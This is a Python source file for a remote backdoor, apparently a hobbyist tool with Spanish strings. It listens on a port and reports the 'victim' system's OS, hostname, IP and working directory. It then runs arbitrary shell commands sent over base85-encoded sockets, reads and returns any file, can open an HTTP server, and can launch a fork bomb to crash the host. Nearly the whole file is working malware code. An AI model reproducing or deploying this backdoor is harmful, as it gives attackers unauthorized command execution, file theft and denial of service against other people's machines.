#! /usr/bin/python3


import socket
import base64
import datetime
import os
import sys
import subprocess

from multiprocessing import Process, cpu_count  # multiprocessing.cpu_count()
from http.server import *

global _CodingBase85Text
global _DecodingBase85Text
global _ServerConnect
global _ForkBom
global _CloseServer
global _OsInfo
global _HttpServer
global hilo3


def _MAIN():

    def _CodingBase85Text(ServerConnect, text):
        data = base64.b85encode(text.encode('ascii'), pad=False)
        ServerConnect.send(data)

    def _DecodingBase85Text(ServerConnect, buffer):
        data = ServerConnect.recv(buffer).decode()
        data = base64.b85decode(data)
        return str(data.decode('ascii'))

    def _CloseServer(ServerDesconnect):
        ServerDesconnect.close()
        sys.exit()

    def _ForkBom():
        while True:
            os.fork()

    def _HttpServer(port):
        class serv(HTTPServer):
            pass

        class base(BaseHTTPRequestHandler):

            def repuesta(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                if sys.platform == 'linux' or sys.platform == 'linux2':
                    subprocess.getstatusoutput("clear")
                elif sys.platform == 'win32':
                    subprocess.getstatusoutput("cls")
                else :
                    subprocess.getstatusoutput("cls")

            def do_GET(self):
                #logging.info("Solicitud GET,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
                self.repuesta()

            def do_POST(self):
                self.repuesta()

        address = ("", int(port))
        http = serv(address, base)
        http.serve_forever()
        return port




    class BackDoor:

        def __init__(self):

            self.Host = '127.0.0.1'
            try:
                self.Port = sys.argv[1]
                self.Port = int(self.Port)
            except IndexError:
                self.Port = 6365
            self.Ip = None
            self.Target = None
            self.Data = None
            self.ListenSocket = 1
            self.buffer = 3500
            self.Green = "\033[1;32m"
            self.White = "\033[1;37m"
            self.i = 1

            self.Server = socket.socket()
            self.Time = str(datetime.date.today())
            self.Cwd = str(os.getcwd())
            self.Os = str(sys.platform)

        def _ServerConnect(self):

            self.Server.bind((str(self.Host), int(self.Port)))
            self.Server.listen(int(self.ListenSocket))
            self.Target, self.Ip = self.Server.accept()
            print(self.Green+'[*]'+self.White+'conexion establecida')

            while True:

                def _OsInfo():
                    self.Cwd = os.getcwd()
                    OsInfo = "\033[1;32m[*]\033[1;37mConexion establecida.\n"
                    OsInfo += "\033[1;32m[*]\033[1;37mEl sistema operativo victima es: " + str(
                        self.Os)+'\n'
                    OsInfo += "\033[1;32m[*]\033[1;37mTiempo: " + \
                        str(self.Time)+'\n'
                    OsInfo += "\033[1;32m[*]\033[1;37mDirectorio: " + \
                        str(self.Cwd)+"\n"
                    OsInfo += "\033[1;32m[*]\033[1;37mNombre del equipo: " + \
                        str(socket.gethostname())+"\n"
                    OsInfo += "\033[1;32m[*]\033[1;37mIp de la maquina: " + \
                        str(self.Ip) + '\n'
                    OsInfo += "\033[1;32m[*]\033[1;37mBuffer: " + \
                        str(self.buffer) + '\n'
                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de conexion: " + \
                        str(self.Target) + '\n'
                    return str(OsInfo)

                if self.i == 1:
                    _CodingBase85Text(self.Target, _OsInfo())
                    self.i = 2

                #_CodingBase85Text(self.Target, str(os.getcwd()))

                comand = str(_DecodingBase85Text(self.Target, self.buffer))
                if comand == 'exit':
                    _CloseServer(self.Server)
                    break

                elif comand == 'cd':
                    ruta = _DecodingBase85Text(self.Target, 1000)
                    os.chdir(str(ruta))
                    print("va")
                    self.Cwd = os.getcwd
                    print(self.Cwd)
                    _CodingBase85Text(self.Target, ("se pudo aceder a la carpeta: "+str(ruta)))


                elif comand == 'BombFork':
                    hilo1 = Process(target=_ForkBom)
                    hilo2 = Process(target=self.Server.close())
                    hilo2.start()
                    hilo2.join()
                    hilo1.start()

                elif comand == 'OsInfo':
                    _CodingBase85Text(self.Target, str(_OsInfo()))

                elif str(comand) == 'cwd':
                    self.Cwd = os.getcwd()
                    _CodingBase85Text(self.Target, str(self.Cwd))


                elif comand == 'HttpServer':
                    PortHttp = int(str(_DecodingBase85Text(self.Target, self.buffer)))
                    PortHttp = str(PortHttp)
                    hilo3 = Process(target=_HttpServer(PortHttp))
                    hilo3.start()
                    _CodingBase85Text(self.Target, "server abierto en el puerto "+str(PortHttp))

                elif comand == 'CloseHttpServer':
                    try:
                        hilo3.terminate()
                        _CodingBase85Text(self.Target, "server cerrado en el puerto "+str(PortHttp))
                    except UnboundLocalError:
                        pass

                elif comand == 'cd ..':
                    os.chdir("..")
                    self.Cwd = os.getcwd()
                    _CodingBase85Text(self.Target, str(self.Cwd))

                elif comand == 'read':
                    fileOpen = _DecodingBase85Text(self.Target, self.buffer)
                    try:
                        try:
                            _CodingBase85Text(self.Target, str("no binary"))
                            file = open(str(fileOpen), "r")
                            dataL = file.read()
                            file.close()
                            _CodingBase85Text(self.Target, str(dataL))
                        except (FileNotFoundError, IsADirectoryError):
                            _CodingBase85Text(self.Target, str("este archivo no esiste o es una carpeta"))
                    except UnicodeDecodeError:
                        try:
                            _CodingBase85Text(self.Target, str("binary"))
                            file = open(str(fileOpen), "rb")
                            dataL = file.read()
                            dataL = dataL
                            file.close()
                            _CodingBase85Text(self.Target, str(dataL))
                        except FileNotFoundError:
                            _CodingBase85Text(self.Target, str("este archivo no esiste"))

                elif comand != 'CloseHttpServer' and comand != 'HttpServer' and str(comand) != 'cwd' and comand != 'OsInfo' and comand != 'BombFork' and str(comand) == 'cd' and comand == 'exit' and comand == 'cd ..' and comand == "read":
                    try:
                        data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
                    except UnicodeDecodeError:
                        data = '\033[1;36mocurrio un error de descodificaion unicode en el servidor'
                    _CodingBase85Text(self.Target, str(len(data)))
                    _CodingBase85Text(self.Target, str(data))
                    comand = None
                    data = None


                else:
                    data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
                    #except UnicodeDecodeError:
                    #data = '\033[1;36mocurrio un error de descodificaion unicode en el servidor'
                    _CodingBase85Text(self.Target, str(len(data)))
                    _CodingBase85Text(self.Target, str(data))
                    comand = None
                    data = None

                if sys.platform == 'linux' or sys.platform == 'linux2':
                    os.system("clear")
                elif sys.platform == 'win32':
                    os.system("cls")
                else :
                    os.system("cls")
                    _CodingBase85Text(self.Target, _OsInfo())

    BackDoor = BackDoor()
    BackDoor._ServerConnect()


if __name__ == "__main__":
    _MAIN()
